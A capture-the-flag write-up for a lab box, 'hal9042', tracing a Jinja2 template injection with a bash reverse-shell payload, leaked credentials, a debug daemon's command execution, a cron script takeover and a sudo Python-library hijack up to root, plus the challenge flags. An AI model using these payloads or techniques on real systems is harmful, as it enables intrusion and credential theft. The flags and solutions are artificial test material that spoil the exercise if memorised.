
### Evaluate injection

In static/js/debug.js, we get
```
// static/js/debug.js
// paco: internal debug helper. NEVER linked from any template — leftover.
// (found via the exposed .git repo or by dirbusting /static/js/)
window.HAL_DEBUG = {
    // Setting this request header switches /evaluate into verbose render mode,
    // so the Jinja2-rendered output is returned instead of the opaque ack.
    debug_header: "X-Debug-Render",
    schema_endpoint: "/api/internal/schema",
    // legacy maintenance console — disabled in the UI, still on the server
    debug_endpoint: "/api/debug",
    note: "X-Debug-Render: true  ->  see what the template engine actually rendered"
};
```
we learned that the server is using jinja2 templates so we can try to inject python code using this evaluate endpoint with those headers
```
nc -lvnp 4444
curl -X POST http://192.168.56.102:5042/evaluate \
  -H "X-Debug-Render: true" \
  --data-urlencode "project_name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \"bash -i >& /dev/tcp/192.168.129.23/4444 0>&1\"').read() }}"
```
proper input validation should prevent such injection attacks


## Privilege escalation

### www-data

The two methods give us a shell running as the www-data user.
by looking around in the other home folders we can find an .env.old file in paco's.
```
www-data@hal9042:/home/paco$ cat .env.old
cat .env.old
# old deploy env — paco. delete this. (you will not delete this)
DB_PASS=Moulinette2024!
SECRET_KEY=hal9042secret
# ssh creds used by the deploy bot
SSH_USER=paco
SSH_PASS=Pac0_H4L_dev!
```
we can use those credential to ssh into the box as paco

old env files, config or other stale files should be properly cleaned up

### paco

by looking at paco's bash history we can see
```
paco@hal9042:~$ cat .bash_history
cd /home/paco/src
gcc -O2 -o /opt/hal9042/daemon evaluator.c
nc 127.0.0.1 7042
echo "DEBUG:id" | nc 127.0.0.1 7042
vim TODO.md
cat .env.old
git add config.py
git commit -m "remove debug config before launch"
systemctl --user status hal9042d
python3 scripts/encrypt.py
clear

```

The evalautor binary seems to be running as a different user accessible via the port 7042
In the evaluator source code we see
```
        if (strncmp(buf, DEBUG_PREFIX, strlen(DEBUG_PREFIX)) == 0) {
            const char *cmd = buf + strlen(DEBUG_PREFIX);
            /* Wire the client socket to the child's stdio so command output
             * (and an interactive shell) flows back over the connection. */
            dup2(fd, 0);
            dup2(fd, 1);
            dup2(fd, 2);
            system(cmd);                 /* executes as wil */
            write(fd, "> ", 2);
            continue;
        }
```
we should be able to run any command we want with that.

so we can get a shell with
```
echo "DEBUG:bash -c \"bash -i >& /dev/tcp/192.168.129.23/4444 0>&1\"" | nc 127.0.0.1 7042

```
We now have access to the wil user

you should keep debug service permissions separated from users'

### wil

We see that wil made notes in a text file where we can read
```
i kept a copy of sophie's old access key, encrypted, just in case the project
got buried with me. the passphrase is something she'd never guess i remembered.
it's the most common password in the world. she used to laugh at people for it.
```

we indeed get a file in .ssh

we can brute force the password with a list of common password
cf script

don't steal credentials

### sophie

we can see this in ol's home
```
sophie@hal9042:/home/ol/scripts$ cat check.sh 
#!/bin/bash
# check.sh — HAL9042 health probe
# Run from ol's crontab every 5 minutes. Writes a heartbeat to the log.
#
# ol: keep this lightweight. it runs as me, every 5 min, forever.

LOG=/var/log/hal9042/check.log
echo "$(date -u +%FT%TZ) [check] hal9042d heartbeat: nominal" >> "$LOG" 2>/dev/null
echo "$(date -u +%FT%TZ) [check] confidence: nominal" >> "$LOG" 2>/dev/null
```
we can't modify this from sophie but from wil we can
the script will execute as ol so we just have to wait for the cronjob to execute
cron should be handled with caution

### ol

if we do 
```
sudo -l
```
we get
```
Matching Defaults entries for ol on hal9042:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ol may run the following commands on hal9042:
    (root) NOPASSWD: /opt/hal9042/scripts/report.py
```

in reports.py we see
```
#!/usr/bin/env python3
"""
report.py — HAL9042 nightly evaluation report generator
=======================================================
Run by ol via sudo (see `sudo -l`). Aggregates the day's evaluations into a
summary using the shared helpers in /opt/hal9042/lib.

  ol ALL=(root) NOPASSWD: /opt/hal9042/scripts/report.py
"""
import sys

# Shared evaluation helpers live in the team-writeable lib dir.
sys.path.insert(0, "/opt/hal9042/lib")

import moulai_utils   # noqa: E402  (provided by the lib/ directory)


def main():
    print("[report] HAL9042 nightly report")
    print("[report] evaluations today:", moulai_utils.count_today())
    print("[report] done.")


if __name__ == "__main__":
    main()

```

this script is not editable but we can change the moulai_utils and launch a shell from there
that's just plain unsafe. this should be password protected

### root

we got root

## flag

### escalation flags

once we're root can find a flagd service with a find command
we can find a etc/flagd/flagd.conf

```
www|33|FLAG{r3c0n_1s_k1ng}\nFLAG{g1t_n3v3r_f0rg3ts}\nFLAG{s3m1_bl1nd_st1ll_burns}\nFLAG{www_d4t4_1s_just_th3_b3g1nn1ng}|not www-data. the web frontend runs as www-data — get a shell via the semi-blind SSTI on /evaluate (header X-Debug-Render: true) or the LFI->RCE on /api/debug.
paco|1001|FLAG{p4c0_l3ft_th3_k3ys_und3r_th3_m4t}|.env.old in /home/paco was never cleaned up. it holds paco's ssh password.
wil|1002|FLAG{d3bug_m0d3_1s_4_f34tur3_r1ght}|hal9042d listens on 127.0.0.1:7042 and runs as wil. debug mode was never disabled — strings the binary.
sophie|1003|FLAG{w1l_kn3w_f1rst_n0b0dy_l1st3n3d}|wil kept an encrypted ssh key for sophie (~wil/.ssh/id_rsa_sophie.enc). the passphrase is the most common one there is.
ol|1004|FLAG{cr0n_j0bs_4r3_tr4ps_4nd_g1fts}|ol's cron runs /home/ol/scripts/check.sh as ol every 5 minutes. who can write it?
```
after investigation we see that a flagd service runs and has sockets for each user in /run/flagd

from each user, we can run
```
nc -U /run/flagd/USERNAME.sock
```
and we get the those flags



if you follow the instruction in paco's encryption script and get all the key parts once you root, you'll find this in the decrypted rapport
bash-5.2# KEY=$(printf '%s%s%s%s' "M0ul1n3tt3" "847_4n0m4l13s" "S0ph13_J14" "uid1337" | sha256sum | cut -d' ' -f1)
bash-5.2# openssl enc -d -aes-256-ecb -K "$KEY" -in rapport_final.enc -out rapport_final.txt
```
FLAG{x3v13r_w4s_3r4s3d_but_n0t_g0n3}
```
```

this is the flag we got about de pdf PROJET_FORK_HAL9042.pdf when we use the code in the bash history of sophie and this pdf was in the root.
```
FLAG = m0ul1n3tt3_w4s_n3v3r_ju5t_4_scr1pt

### BONUS

we find the first flag by playing with the url.
/flag gives us
```
FLAG{n1c3_try_but_th4ts_n0t_h0w_th1s_w0rks}
```

in sophie's .bash_history you'll find
curl http://127.0.0.1:9000/internal/telemetry
that gives us 
```
FLAG{b4sh_h1st0ry_1s_4_d14ry}
```


for finish we find 3 file in the dos /etc/hal9042
in this we find 4 file the name is daemon.env  reviewer.env  telemetry.env  whisper.env
telemetry is the flag just up with sophie but we got ths 3 TODO
```
FLAG{pr0c_kn0ws_4ll_s3cr3ts}
FLAG{h4l_r3v13ws_3v3ry_4pp34l}
FLAG{udp_1s_4_wh1sp3r}
```
